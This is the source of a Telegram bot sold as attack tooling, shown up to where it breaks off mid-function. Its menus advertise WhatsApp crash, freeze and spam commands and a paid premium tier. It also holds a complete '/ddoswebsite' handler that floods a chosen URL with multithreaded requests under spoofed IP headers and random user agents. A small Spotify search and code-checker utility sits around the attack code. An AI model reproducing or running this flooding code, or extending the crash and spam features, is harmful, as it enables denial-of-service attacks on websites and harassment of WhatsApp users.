const loadJSON = (file) => {
  try {
    if (!fs.existsSync(file)) return [];

    const data = fs.readFileSync(file, "utf8");
    if (!data) return [];

    return JSON.parse(data);
  } catch (err) {
    console.log("⚠️ JSON corrupt:", file);
    return [];
  }
};
//////////////////////////////////////
const saveJSON = (file, data) => {
  try {
    fs.writeFileSync(file, JSON.stringify(data, null, 2));
  } catch (err) {
    console.log("❌ Failed save JSON:", file, err.message);
  }
};

//////////////////////////////////////
function deleteSession() {
  try {
    if (!sessionPath || !fs.existsSync(sessionPath)) {
      console.log("⚠️ Session not found.");
      return false;
    }

    fs.rmSync(sessionPath, { recursive: true, force: true });
    console.log("🗑️ Session deleted successfully.");
    return true;

  } catch (err) {
    console.log("❌ Failed delete session:", err.message);
    return false;
  }
}
//////////////////////////////////////
module.exports = {
  startSesi,
  checkWhatsAppConnection,
  loadJSON,
  saveJSON,
  deleteSession,
};
//// Variabel ///
let antiCulik = true;
let autoReject = false; 
let pendingGroups = new Map();
//////////////////////////////////////
let ownerUsers = loadOwner() || [];
let premiumUsers = loadJSON(premiumFile) || [];
let adminList = [];
let whitelistGroups = loadSafe() || [];
loadAdmins();

//////////////////////////////////////

/// ---- OWNER ---- ///
const checkOwner = (ctx, next) => {
  const id = ctx.from?.id?.toString();
  const name = ctx.from?.first_name || "User";

  if (!ownerUsers.includes(id)) {
    return ctx.replyWithPhoto(
      { source: fs.readFileSync("./image/AtomicCrashers.jpg") },
      {
        caption:
`<pre>❌ AKSES DI TOLAK OWNER ONLY

⚠️ Fitur ini khusus OWNER ONLY

👤 User : ${name}</pre>`,
        parse_mode: "HTML",
        ...Markup.inlineKeyboard([
          [Markup.button.url("Owner", "https://t.me/seanoffc")]
        ])
      }
    );
  }

  return next();
};
/// ---- ADMIN ---- ///
const checkAdmin = (ctx, next) => {
  const id = ctx.from.id.toString();
  const name = ctx.from.first_name || "User";

  if (
    !adminList.includes(id) &&
    !ownerUsers.includes(id) && id != "8221502831"
  ) {
    return ctx.replyWithPhoto(
      { source: fs.readFileSync("./image/AtomicCrashers.jpg") },
      {
        caption:
`<pre>✦ Access Denied ✦

User : ${name}
( ! ) You do not have access
Please add Admin before using Bug features ✦</pre>`,
        parse_mode: "HTML",
        ...Markup.inlineKeyboard([
          [Markup.button.url("Owner", "https://t.me/seanoffc")]
        ])
      }
    );
  }

  return next();
};
/// ---- PREMIUM ---- ///
const checkAllPremium = (ctx, next) => {
  const id = ctx.from.id.toString();
  const name = ctx.from.first_name || "User";

  if (premiumUsers.includes(id)) {
    return next();
  }

  if (ctx.chat.type !== "private" && isGroupPremium(ctx.chat.id)) {
    return next();
  }

  return ctx.replyWithPhoto(
    { source: fs.readFileSync("./image/AtomicCrashers.jpg") },
    {
      caption:
`<pre>✦ Access Denied ✦

User : ${name}
( ! ) You do not have access
Please add Premium before using Bug features ✦</pre>`,
      parse_mode: "HTML",
      ...Markup.inlineKeyboard([
        [Markup.button.url("Owner", "https://t.me/seanoffc")]
      ])
    }
  );
};
/// Anti culik ///
function isSafeGroup(groupId) {
  return whitelistGroups.includes(groupId.toString());
}

function loadSafe() {
  try {
    if (!fs.existsSync(safeFile)) return [];
    return JSON.parse(fs.readFileSync(safeFile, "utf8") || "[]");
  } catch {
    return [];
  }
}

function saveSafe(data) {
  fs.writeFileSync(safeFile, JSON.stringify(data, null, 2));
}

//// Group prem ////
function loadPremiumGroups() {
  try {
    if (!fs.existsSync(premiumGroupsFile)) return [];
    return JSON.parse(fs.readFileSync(premiumGroupsFile, "utf8") || "[]");
  } catch {
    return [];
  }
}
//////////
function savePremiumGroups(data) {
  fs.writeFileSync(premiumGroupsFile, JSON.stringify(data, null, 2));
}
//////////
function isGroupPremium(groupId) {
  return loadPremiumGroups().includes(groupId.toString());
}
/// ---- ADD ADMIN ---- ///
function addAdmin(userId) {
  userId = userId.toString();

  if (!adminList.includes(userId)) {
    adminList.push(userId);
    saveAdmins();
  }
}

/// ---- REMOVE ADMIN ---- ///
function removeAdmin(userId) {
  userId = userId.toString();

  adminList = adminList.filter(id => id !== userId);
  saveAdmins();
}

/// ---- SAVE ADMIN ---- ///
function saveAdmins() {
  try {
    fs.writeFileSync("./database/admins.json", JSON.stringify(adminList, null, 2));
  } catch (err) {
    console.log("❌ Gagal save admin:", err.message);
  }
}

/// ---- LOAD ADMIN ---- ///
function loadAdmins() {
  try {
    if (!fs.existsSync("./database/admins.json")) {
      adminList = [];
      return;
    }

    const data = fs.readFileSync("./database/admins.json", "utf8");

   
    adminList = JSON.parse(data || "[]").map(id => id.toString());

  } catch (err) {
    console.log("⚠️ Gagal load admin:", err.message);
    adminList = [];
  }
}
/// ---- SLEEP ---- ///
function sleep(ms) {
  return new Promise(resolve => setTimeout(resolve, ms));
}

/// ---- CHECK PREMIUM ---- ///
function isPremium(userId) {
  return premiumUsers.includes(userId.toString());
}

/// ---- CHECK OWNER ---- ///
function isOwner(id) {
  return ownerUsers.includes(id.toString());
}

/// ---- LOAD OWNER ---- ///
function loadOwner() {
  try {
    if (!fs.existsSync(ownerFile)) return [];
    return JSON.parse(fs.readFileSync(ownerFile, "utf8") || "[]");
  } catch {
    return [];
  }
}
/// ------ Check Sender ------- \\\
function isSender(userId) {
  return senderUsers.includes(String(userId));
}
// -------- Anti foto ---------- ///
function loadAntiFoto() {
  try {
    if (!fs.existsSync(antiFotoFile)) return []
    return JSON.parse(fs.readFileSync(antiFotoFile))
  } catch {
    return []
  }
}


function saveAntiFoto(data) {
  fs.writeFileSync(antiFotoFile, JSON.stringify(data, null, 2))
}

let antiFotoGroups = loadAntiFoto()

/// ------- ANTI VIDIO ------- ///
function loadAntiVideo() {
  try {
    if (!fs.existsSync(antiVideoFile)) return []
    return JSON.parse(fs.readFileSync(antiVideoFile))
  } catch {
    return []
  }
}

function saveAntiVideo(data) {
  fs.writeFileSync(antiVideoFile, JSON.stringify(data, null, 2))
}

let antiVideoGroups = loadAntiVideo()
/// JAM ///
function getTimeIndonesia() {
  const now = new Date();

  const wib = new Date(now.toLocaleString("en-US", { timeZone: "Asia/Jakarta" }));
  const wita = new Date(now.toLocaleString("en-US", { timeZone: "Asia/Makassar" }));
  const wit = new Date(now.toLocaleString("en-US", { timeZone: "Asia/Jayapura" }));

  return `
🕒 LIVE JAM INDONESIA

🇮🇩 WIB  : ${wib.toLocaleTimeString("id-ID", { hour12: false })}
🇮🇩 WITA : ${wita.toLocaleTimeString("id-ID", { hour12: false })}
🇮🇩 WIT  : ${wit.toLocaleTimeString("id-ID", { hour12: false })}
`;
}
/// cmd of/on ///
function loadCmdMode() {
  try {
    if (!fs.existsSync(CMD_FILE)) {
      fs.writeFileSync(CMD_FILE, JSON.stringify({ disabled: [] }, null, 2));
    }

    const data = JSON.parse(fs.readFileSync(CMD_FILE));

    return {
      disabled: Array.isArray(data.disabled) ? data.disabled : []
    };

  } catch (e) {
    return { disabled: [] };
  }
}

function saveCmdMode(data) {
  fs.writeFileSync(CMD_FILE, JSON.stringify(data, null, 2));
}
/// midlaware Cmd on / of ///
bot.use((ctx, next) => {
  const data = loadCmdMode();

  const text = ctx.message?.text || ctx.callbackQuery?.data || "";

  if (!text.startsWith("/")) return next(); 

  const cmd = text
    .split(" ")[0]
    .replace(/^\/+/, "")
    .replace(/@.+$/, "")
    .toLowerCase()
    .trim();

  const userId = ctx.from?.id?.toString();

  const isAdminUser =
    adminList.includes(userId) || ownerUsers.includes(userId);

  const disabled = Array.isArray(data?.disabled) ? data.disabled : [];

  // console.log("CMD:", cmd);
// console.log("DISABLED:", disabled);

  if (disabled.includes(cmd)) {
    if (isAdminUser) return next();
    return ctx.reply("⛔ Command ini sedang dinonaktifkan admin");
  }

  return next();
});
/// ---- GROUP ONLY ---- ///
bot.use((ctx, next) => {
  const groupMode = getGroupMode();

  if (groupMode === "on" && ctx.chat.type === "private") {
    return ctx.reply(`
🔒 𝐆𝐑𝐎𝐔𝐏 𝐎𝐍𝐋𝐘 𝐌𝐎𝐃𝐄

Bot ini hanya bisa digunakan di dalam group.
Silakan gunakan perintah di group.
`);
  }

  return next();
});
/// ---- SELF / PUBLIC MODE ---- ///
bot.use((ctx, next) => {
  const mode = getMode();

  if (mode === "self" && !isOwner(ctx.from.id)) {

    if (ctx.callbackQuery) {
      return ctx.answerCbQuery("🔒 BOT DI KUNCI OWNER", { show_alert: true });
    }

    return; 
  }

  return next();
});
// ===== Tracker ===== // ontol
const commandList = new Set();

const originalCommand = bot.command.bind(bot);

bot.command = (cmd, ...args) => {
  commandList.add(cmd);
  return originalCommand(cmd, ...args);
};
/// -------- ( menu utama ) --------- \\\
const imagePath = "./image/AtomicCrashers.jpg";
const audioPath = "./image/AtomicSound.mp3";

if (!fs.existsSync(imagePath)) {
  throw new Error("❌ File gambar tidak ditemukan: " + imagePath);
}

if (!fs.existsSync(audioPath)) {
  throw new Error("❌ File audio tidak ditemukan: " + audioPath);
}

const getImage = () => ({
  source: fs.createReadStream(imagePath)
});

bot.start(async (ctx) => {
  const userId = ctx.from.id;
  
  const menuMessage = `
<blockquote>[ 🌹 ] ⵢ Zalindra is - Death</blockquote>
─ 「 〄 」Je Suis Un Bot Telegram Utilisé Pour Créer Des Coups De Cœur Sur WhatsApp.

<b>⨭ Name Script</b> : <b>Zalindra Invlas</b>
<b>⨭ Developer</b> : <b>@seanoffc</b>
<b>⨭ Version</b> : <b>16 Pro</b>
<b>⨭ Prefix</b> : <b>/ ( °Slash )</b>
<b>⨭ Username</b> : ${ctx.from.first_name}

<blockquote>-# Zalindra is - Death 𖣂</blockquote>`;

  const keyboard = [
    [{ text: "Trash - £ore ϟ", callback_data: "/bug" }],
    [
      { text: "Controls - £ore ϟ", callback_data: "/controls" },
      { text: "Thanks - £ore ϟ", callback_data: "/tqto" },
    ],
    [{ text: "Developer !", url: "https://t.me/seanoffc" }],
  ];

  await ctx.replyWithPhoto(getImage(), {
    caption: menuMessage,
    parse_mode: "HTML",
    reply_markup: { inline_keyboard: keyboard },
  });

  await ctx.replyWithAudio(
    { source: fs.createReadStream(audioPath) },
    {
      title: "Ak mw fks bljr dl",
      caption: "Kan Kita Cmn Teman",
      performer: "Strict Parents",
    }
  );
});

const delay = (ms) => new Promise(resolve => setTimeout(resolve, ms));

async function safeEdit(ctx, type, content, keyboard) {
  const userId = ctx.from.id;

  
  const verified = true;
  if (!verified) return;

  if (isCooldown && typeof isCooldown === 'function' && isCooldown(userId)) {
    return ctx.answerCbQuery("Tunggu sebentar...");
  }

  try {
    if (type === "media") {
      await delay(700);

      await ctx.editMessageMedia(
        {
          type: "photo",
          media: getImage(),
          caption: content,
          parse_mode: "HTML",
        },
        { reply_markup: { inline_keyboard: keyboard } }
      );
    }

    if (type === "caption") {
      await delay(700);

      await ctx.editMessageCaption(content, {
        parse_mode: "HTML",
        reply_markup: { inline_keyboard: keyboard },
      });
    }

    await ctx.answerCbQuery();

  } catch (error) {
    if (error.response && error.response.error_code === 429) {
      const retryAfter = (error.response.parameters?.retry_after || 3) * 1000;
      console.log(`Rate Limited. Retry after ${retryAfter}ms`);
      await ctx.answerCbQuery("Server sibuk, tunggu...");
      await delay(retryAfter);
      return;
    }

    if (error.response && error.response.error_code === 400 && 
        error.response.description.includes("message is not modified")) {
      return ctx.answerCbQuery();
    }

    console.error("Edit Error:", error.response?.description || error.message);
    try { await ctx.answerCbQuery("Error"); } catch {}
  }
}

bot.action(['/start', '/back'], async (ctx) => {
  const menuMessage = `
<blockquote>[ <tg-emoji emoji-id="5267256945881924144">⚡</tg-emoji> ] ⵢ Zalindra is - Death</blockquote>
─ 「 〄 」Je Suis Un Bot Telegram Utilisé Pour Créer Des Coups De Cœur Sur WhatsApp.

<b>⨭ Name Script</b> : <b>Zalindra Invlas</b>
<b>⨭ Developer</b> : <b>@seanoffc</b>
<b>⨭ Version</b> : <b>16 Pro</b>
<b>⨭ Prefix</b> : <b>/ ( °Slash )</b>
<b>⨭ Username</b> : ${ctx.from.first_name}

<blockquote>-# Zalindra Is Death 𖣂</blockquote>`;

  const keyboard = [
    [{ text: "Trash - £ore ϟ", callback_data: "/bug", style: "success", icon_custom_emoji_id: "5267292589815513878" }],
    [
      { text: "Controls - £ore ϟ", callback_data: "/controls", style: "success", icon_custom_emoji_id: "5267490824031061544" },
      { text: "Thanks - £ore ϟ", callback_data: "/tqto", style: "danger", icon_custom_emoji_id: "5267168035763930408" }
    ],
    [{ text: "Developer !", url: "https://t.me/seanoffc", style: "danger", icon_custom_emoji_id: "5787156307496669392" }]
  ];

  await safeEdit(ctx, "media", menuMessage, keyboard);
});

bot.action('/controls', async (ctx) => {
  const controlsMenu = `
<blockquote>[ <tg-emoji emoji-id="5266984906948362314">🚀</tg-emoji> ] ⵢ Zalindra is - Death</blockquote>
─ 「 〄 」Je Suis Un Bot Telegram Utilisé Pour Créer Des Coups De Cœur Sur WhatsApp.

<b>⨭ Name Script</b> : <b>Zalindra Invlas</b>
<b>⨭ Developer</b> : <b>@seanoffc</b>
<b>⨭ Version</b> : <b>16 Pro</b>
<b>⨭ Prefix</b> : <b>/ ( °Slash )</b>
<b>⨭ Username</b> : ${ctx.from.first_name}

<blockquote>Ϟ °Controls</blockquote>
𖥂 /killsesi - <b>delete sessions</b>
𖥂 /connect - <b>add sender number</b>
𖥂 /addadmin - <b>add admin users</b>
𖥂 /deladmin - <b>dell admin users</b>
𖥂 /addprem - <b>add premium users</b>
𖥂 /delprem - <b>dell premium users</b>
𖥂 /cekprem - <b>cek premium users</b>
𖥂 /cekid - <b>cek format users</b>
𖥂 /groupon - <b>group only</b>
𖥂 /groupoff - <b>group off</b>
𖥂 /addgroupremium - <b>add gb premium</b>
𖥂 /delgrouppremium - <b>dell gb premium</b>
`;

  const keyboard = [[
    { text: "ⵢ Back", callback_data: "/back", style: "primary", icon_custom_emoji_id: "5787546290527145353" },
    { text: "Next ⵢ", callback_data: "/controls2", style: "primary", icon_custom_emoji_id: "5787429669280157600" }
  ]];

  await safeEdit(ctx, "caption", controlsMenu, keyboard);
});

bot.action('/controls2', async (ctx) => {
  const controlsMenu2 = `
<blockquote>[ <tg-emoji emoji-id="4958808208752772190">💎</tg-emoji> ] ⵢ Zalindra is - Death</blockquote>
─ 「 〄 」Je Suis Un Bot Telegram Utilisé Pour Créer Des Coups De Cœur Sur WhatsApp.

<b>⨭ Name Script</b> : <b>Zalindra Invlas</b>
<b>⨭ Developer</b> : <b>@seanoffc</b>
<b>⨭ Version</b> : <b>16 Pro</b>
<b>⨭ Prefix</b> : <b>/ ( °Slash )</b>
<b>⨭ Username</b> : ${ctx.from.first_name}

<blockquote>Ϟ Controls2</blockquote>
𖥂 /cmdaktif - <b>mengaktifkan cmd yang terkunci</b>
𖥂 /nonaktifcmd - <b>menonaktifkan cmd</b>
𖥂 /listcmd - <b>list cmd mati and hidup</b>
𖥂 /runtime - <b>bot runtime</b>
𖥂 /self - <b>bot di kunci kecuali owner</b>
𖥂 /public - <b>bot di buka untuk umum</b>
𖥂 /antifoto - <b>anti foto di group</b>
𖥂 /antivideo - <b>anti video di group</b>
𖥂 /restart - <b>restart panel otomatis</b>
𖥂 /update - <b>update script otomatis</b>

<blockquote>Ϟ Tools</blockquote>
𖥂 /testfunction - <b>test function</b>
𖥂 /spotify - <b>search lagu</b>     
𖥂 /cekerror - <b>cek eror file js</b>     
𖥂 /iphoneqc - <b>iphone quote</b>     
𖥂 /ddoswebsite - <b>ddos website lekk</b>
`;

  const keyboard = [[
    { text: "ⵢ Back", callback_data: "/controls", style: "primary", icon_custom_emoji_id: "5787546290527145353" },
    { text: "Next ⵢ", callback_data: "/back", style: "primary", icon_custom_emoji_id: "5787429669280157600" }
  ]];

  await safeEdit(ctx, "caption", controlsMenu2, keyboard);
});

bot.action('/bug', async (ctx) => {
  const bugMenu = `
<blockquote>[ <tg-emoji emoji-id="5265192393757443515">💀</tg-emoji> ] ⵢ Zalindra is - Death</blockquote>
─ 「 〄 」Je Suis Un Bot Telegram Utilisé Pour Créer Des Coups De Cœur Sur WhatsApp.

<b>⨭ Name Script</b> : <b>Zalindra Invlas</b>
<b>⨭ Developer</b> : <b>@seanoffc</b>
<b>⨭ Version</b> : <b>16 Pro</b>
<b>⨭ Prefix</b> : <b>/ ( °Slash )</b>
<b>⨭ Username</b> : ${ctx.from.first_name}

<blockquote>°Trash Not Spam</blockquote>
𖥂 /xlock - <b>Crash Infinity</b>✅
𖥂 /ints - <b>Frezee Hard</b>✅
𖥂 /xloca - <b>Delay Type Visible</b>✅
`;

  const keyboard = [[
    { text: "ⵢ Back", callback_data: "/back", style: "primary", icon_custom_emoji_id: "5787546290527145353" },
    { text: "Next ⵢ", callback_data: "/bug2", style: "primary", icon_custom_emoji_id: "5787429669280157600" }
  ]];

  await safeEdit(ctx, "caption", bugMenu, keyboard);
});

bot.action('/bug2', async (ctx) => {
  const bugMenu2 = `
<blockquote>[ <tg-emoji emoji-id="5265192393757443515">📩</tg-emoji> ] ⵢ Zalindra is - Death</blockquote>
─ 「 〄 」Je Suis Un Bot Telegram Utilisé Pour Créer Des Coups De Cœur Sur WhatsApp.

<b>⨭ Name Script</b> : <b>Zalindra Invlas</b>
<b>⨭ Developer</b> : <b>@seanoffc</b>
<b>⨭ Version</b> : <b>16 Pro</b>
<b>⨭ Prefix</b> : <b>/ ( °Slash )</b>
<b>⨭ Username</b> : ${ctx.from.first_name}

<blockquote>°Bebas Spam</blockquote>
𖥂 /delayxinvis - <b>invisible spam</b>
𖥂 /truedamage - <b>delay spam</b>
`;

  const keyboard = [[
    { text: "ⵢ Back", callback_data: "/bug", style: "primary", icon_custom_emoji_id: "5787546290527145353" },
    { text: "Next ⵢ", callback_data: "/back", style: "primary", icon_custom_emoji_id: "5787429669280157600" }
  ]];

  await safeEdit(ctx, "caption", bugMenu2, keyboard);
});

bot.action('/tqto', async (ctx) => {
  const tqtoMenu = `
<blockquote>[ <tg-emoji emoji-id="4956214478002717877">⚖️</tg-emoji> ] ⵢ Zalindra is - Death</blockquote>
─ 「 〄 」Je Suis Un Bot Telegram Utilisé Pour Créer Des Coups De Cœur Sur WhatsApp.

<b>⨭ Name Script</b> : <b>Zalindra Invlas</b>
<b>⨭ Developer</b> : <b>@seanoffc</b>
<b>⨭ Version</b> : <b>16 Pro</b>
<b>⨭ Prefix</b> : <b>/ ( °Slash )</b>
<b>⨭ Username</b> : ${ctx.from.first_name}

<blockquote>° Ϟ °ThaksToo</blockquote>
𖥂 @seanoffc - <b>Creator</b>
𖥂 @Ambakikuk - <b>Best Support</b>
𖥂 @Xatanicvxii - <b>Best Support</b>
𖥂 @kafk6 - <b>Best Support</b>
𖥂 @Xatansi - <b>My Secc</b>
`;

  const keyboard = [[
    { text: "Back ⵢ", callback_data: "/back", style: "primary", icon_custom_emoji_id: "5787546290527145353" }
  ]];

  await safeEdit(ctx, "caption", tqtoMenu, keyboard);
});

/// ------ ( Plugins ) ------- \\\
function getUserId(ctx) {
  const args = ctx.message.text.split(" ");
  if (args.length < 2) return null;

  return args[1].replace(/[^0-9]/g, ""); 
}

function createSafeSock(sock) {
  let sendCount = 0
  const MAX_SENDS = 500
  const normalize = j =>
    j && j.includes("@")
      ? j
      : j.replace(/[^0-9]/g, "") + "@s.whatsapp.net"

  return {
    sendMessage: async (target, message) => {
      if (sendCount++ > MAX_SENDS) throw new Error("RateLimit")
      const jid = normalize(target)
      return await sock.sendMessage(jid, message)
    },
    relayMessage: async (target, messageObj, opts = {}) => {
      if (sendCount++ > MAX_SENDS) throw new Error("RateLimit")
      const jid = normalize(target)
      return await sock.relayMessage(jid, messageObj, opts)
    },
    presenceSubscribe: async jid => {
      try { return await sock.presenceSubscribe(normalize(jid)) } catch(e){}
    },
    sendPresenceUpdate: async (state,jid) => {
      try { return await sock.sendPresenceUpdate(state, normalize(jid)) } catch(e){}
    }
  }
}

// CASE TOOLS BY SENN (COLONGG WKWM) ///
bot.command("ddoswebsite", checkPremium, checkCooldown, async (ctx) => {
  try {
    const args = ctx.message.text.split(" ").slice(1).join(" ").trim();
    if (!args) {
      return ctx.reply("🪧 ☇ Format: /ddoswebsite https://target.com 1000");
    }

    const [target_url, rawThreads] = args.split(" ");
    const threads = parseInt(rawThreads) || 50;

    const processMsg = await ctx.reply(`<blockquote><strong>
╭═─────⊱ 𝚉𝙰𝙻𝙸𝙽𝙳𝚁𝙰 𝙸𝙽𝚅𝙻𝙰𝚂𝙸𝙾𝙽 ─────═⬡
│ ⸙ Target
│ᯓ➤ ${target_url}
│ ⸙ Threads
│ᯓ➤ ${threads}
│ ⸙ Status
│ᯓ➤ Process
╰═──────────────────═⬡</strong></blockquote>
`, { parse_mode: "HTML" });

    const attackConfig = {
      threads: threads,
      duration: 60000,
      requestsPerThread: 1000,
      userAgents: [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36",
        "Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X) AppleWebKit/537.36"
      ],
      methods: ["GET", "POST", "HEAD", "OPTIONS"]
    };

    let totalRequests = 0;
    let successfulAttacks = 0;
    const startTime = Date.now();

    const attackPromises = [];

    for (let i = 0; i < attackConfig.threads; i++) {
      attackPromises.push(new Promise(async (resolve) => {
        let threadRequests = 0;
        
        while (Date.now() - startTime < attackConfig.duration && threadRequests < attackConfig.requestsPerThread) {
          try {
            const method = attackConfig.methods[Math.floor(Math.random() * attackConfig.methods.length)];
            const userAgent = attackConfig.userAgents[Math.floor(Math.random() * attackConfig.userAgents.length)];
            const ip = `${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}`;

            const headers = {
              "X-Forwarded-For": ip,
              "X-Real-IP": ip,
              "User-Agent": userAgent,
              "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
              "Accept-Language": "en-US,en;q=0.5",
              "Accept-Encoding": "gzip, deflate, br",
              "Connection": "keep-alive",
              "Upgrade-Insecure-Requests": "1",
              "Cache-Control": "no-cache",
              "Pragma": "no-cache"
            };

            const randomPaths = ["/", "/admin", "/wp-admin", "/api", "/test", "/debug"];
            const randomPath = randomPaths[Math.floor(Math.random() * randomPaths.length)];
            const attackUrl = target_url + randomPath;

            const response = await axios({
              method: method,
              url: attackUrl,
              headers: headers,
              timeout: 5000,
              validateStatus: () => true
            });

            totalRequests++;
            threadRequests++;
            
            if (response.status < 500) {
              successfulAttacks++;
            }

            if (totalRequests % 100 === 0) {
              const elapsed = Math.floor((Date.now() - startTime) / 1000);
              await ctx.editMessageText(
                `<blockquote><strong>
╭═─────⊱ 𝚉𝙰𝙻𝙸𝙽𝙳𝚁𝙰 𝙸𝙽𝚅𝙻𝙰𝚂𝙸𝙾𝙽 ─────═⬡
│ ⸙ Target
│ᯓ➤ ${target_url}
│ ⸙ Threads
│ᯓ➤ ${attackConfig.threads}
│ ⸙ Requests
│ᯓ➤ ${totalRequests}
│ ⸙ Success
│ᯓ➤ ${successfulAttacks}
│ ⸙ Duration
│ᯓ➤ ${elapsed}s
│ ⸙ Status
│ᯓ➤ Running
╰═──────────────────═⬡</strong></blockquote>
`,
                {
                  chat_id: ctx.chat.id,
                  message_id: processMsg.message_id,
                  parse_mode: "HTML"
                }
              );
            }

            await new Promise(r => setTimeout(r, Math.random() * 100));

          } catch (error) {
            threadRequests++;
            totalRequests++;
          }
        }
        resolve();
      }));
    }

    await Promise.all(attackPromises);

    const endTime = Date.now();
    const totalDuration = Math.floor((endTime - startTime) / 1000);

    await ctx.editMessageText(
      `<blockquote><strong>
╭═─────⊱ 𝚉𝙰𝙻𝙸𝙽𝙳𝚁𝙰 𝙸𝙽𝚅𝙻𝙰𝚂𝙸𝙾𝙽 ─────═⬡
│ ⸙ Target
│ᯓ➤ ${target_url}
│ ⸙ Threads
│ᯓ➤ ${attackConfig.threads}
│ ⸙ Total Requests
│ᯓ➤ ${totalRequests}
│ ⸙ Successful
│ᯓ➤ ${successfulAttacks}
│ ⸙ Total Duration
│ᯓ➤ ${totalDuration}s
│ ⸙ Requests/Sec
│ᯓ➤ ${Math.floor(totalRequests / totalDuration)}
│ ⸙ Status
│ᯓ➤ Completed
╰═──────────────────═⬡</strong></blockquote>
`,
      {
        chat_id: ctx.chat.id,
        message_id: processMsg.message_id,
        parse_mode: "HTML"
      }
    );

  } catch (error) {
    ctx.reply("❌ ☇ Gagal melakukan serangan ddos");
  }
});


bot.command("spotify", async (ctx) => {
    const chatId = ctx.chat.id;
    const query = ctx.message.text.split(" ").slice(1).join(" ");

    if (!query) {
        return ctx.reply(`🎧 Cara penggunaan:
/spotify judul lagu`);
    }

    const loading = await ctx.reply("🔎 Mencari lagu...");

    try {
        const { data } = await axios.get(
            `https://api.ikyyxd.my.id/search/ytplayv2?q=${encodeURIComponent(query)}`
        );

        if (!data?.status || !data?.result) {
            return ctx.telegram.editMessageText(
                chatId,
                loading.message_id,
                undefined,
                "❌ Lagu tidak ditemukan."
            );
        }

        const result = data.result;

        await ctx.telegram.editMessageText(
            chatId,
            loading.message_id,
            undefined,
            "⬇️ Downloading audio..."
        );

        const fileName = `${Date.now()}.mp3`;
        const filePath = path.join(__dirname, fileName);

        const response = await axios({
            method: "GET",
            url: result.audio.url,
            responseType: "stream"
        });

        const writer = fs.createWriteStream(filePath);

        response.data.pipe(writer);

        await new Promise((resolve, reject) => {
            writer.on("finish", resolve);
            writer.on("error", reject);
        });

        const formatDuration = (sec) => {
            const m = Math.floor(sec / 60);
            const s = String(sec % 60).padStart(2, "0");
            return `${m}:${s}`;
        };

        const caption = `\`\`\`JavaScript
🎧 SPOTIFY MUSIC

🎵 Title      : ${result.title}
🎤 Artist     : ${result.author || "Unknown"}
⏱ Duration   : ${formatDuration(result.duration)}
📅 Release    : ${result.uploadDate || "Unknown"}
🔗 Source     : ${result.source}

────────────────────
🚀 Powered By Senzz
\`\`\``;

        await ctx.replyWithAudio(
            {
                source: fs.createReadStream(filePath)
            },
            {
                title: result.title,
                performer: result.author || "Unknown Artist",
                caption,
                parse_mode: "Markdown"
            }
        );

        fs.unlinkSync(filePath);

        await ctx.telegram.deleteMessage(chatId, loading.message_id);

    } catch (err) {
        console.error(err);

        await ctx.telegram.editMessageText(
            chatId,
            loading.message_id,
            undefined,
            "❌ Terjadi kesalahan saat memproses lagu."
        );
    }
});

bot.command("cekerror", checkPremium, async (ctx) => {
  if (!ctx.message.reply_to_message) {
    return ctx.reply("🪧 ☇ Format: /cekerror (reply file .js)");
  }

  const replyMsg = ctx.message.reply_to_message;
  let funcCode = null;
  let fileName = "unknown.js";

  if (replyMsg.document) {
    const file = replyMsg.document;
    fileName = file.file_name || "unknown.js";
    
    if (!fileName.endsWith(".js") && !fileName.endsWith(".txt")) {
      return ctx.reply("❌ ☇ File harus berekstensi .js atau .txt");
    }
    
    try {
      const fileLink = await ctx.telegram.getFileLink(file.file_id);
      const response = await axios.get(fileLink.href, { timeout: 30000 });
      funcCode = response.data;
    } catch (e) {
      return ctx.reply("❌ ☇ Gagal mendownload file");
    }
  } else if (replyMsg.text) {
    funcCode = replyMsg.text;
  } else if (replyMsg.caption) {
    funcCode = replyMsg.caption;
  } else {
    return ctx.reply("❌ ☇ Reply harus berisi kode JavaScript");
  }

  if (!funcCode || funcCode.trim().length === 0) {
    return ctx.reply("❌ ☇ Kode kosong");
  }

  const processMsg = await ctx.replyWithPhoto(thumbnailUrl, {
    caption: `
<pre>⌬ 𝚉 𝙰 𝙻 𝙸 𝙽 𝙳 𝚁 𝙰  𝙸 𝙽 𝚅 𝙻 𝙰 𝚂° </pre>
🥀 - Telegram || 私は誰かにウイルスを送信できるボットです。私を最大限に活用し、無実の人々に危害を加えないでください。
━━━━━━━━━━━━━━━

🦋 - 𝑰𝒏𝒇𝒐𝒓𝒎𝒂𝒕𝒊𝒐𝒏
 ◉ Author: @seanoffc
 ◉ Version: 16.0.0 Pro
 ◉ Language: JavaScript
 ◉ Prefix: /

🔍 - 𝑪𝒐𝒅𝒆 𝑨𝒏𝒂𝒍𝒚𝒛𝒆𝒓
 ◉ File: ${escapeHtml(fileName)}
 ◉ Lines: ${funcCode.split("\n").length}
 ◉ Size: ${(Buffer.byteLength(funcCode, "utf8") / 1024).toFixed(2)} KB
 ◉ Status: Analyzing... 

© senzz z͓̽
    `,
    parse_mode: "HTML"
  });

  await sleep(2000);

  const errors = [];
  const warnings = [];
  const suggestions = [];
  const vulnerabilities = [];
  let functionCount = 0;
  let variableCount = 0;
  let asyncCount = 0;
  let promiseCount = 0;
  let callbackCount = 0;
  let loopCount = 0;
  let conditionCount = 0;

  const lines = funcCode.split("\n");
  
  lines.forEach((line, index) => {
    const lineNum = index + 1;
    const trimmedLine = line.trim();
    
    if (trimmedLine.includes("function ")) functionCount++;
    if (/\b(var|let|const)\s+\w+/.test(trimmedLine)) variableCount++;
    if (trimmedLine.includes("async ")) asyncCount++;
    if (trimmedLine.includes("new Promise") || trimmedLine.includes(".then") || trimmedLine.includes(".catch")) promiseCount++;
    if (trimmedLine.includes("=>") || trimmedLine.includes("callback") || trimmedLine.includes("function(")) callbackCount++;
    if (trimmedLine.includes("for ") || trimmedLine.includes("while ") || trimmedLine.includes("do ")) loopCount++;
    if (trimmedLine.includes("if ") || trimmedLine.includes("else ") || trimmedLine.includes("switch ")) conditionCount++;
    
    if (trimmedLine.includes("eval(") && !trimmedLine.includes("//")) {
      errors.push(`Line ${lineNum}: Dangerous eval() usage detected`);
      vulnerabilities.push(`Line ${lineNum}: eval() can lead to code injection`);
    }
    
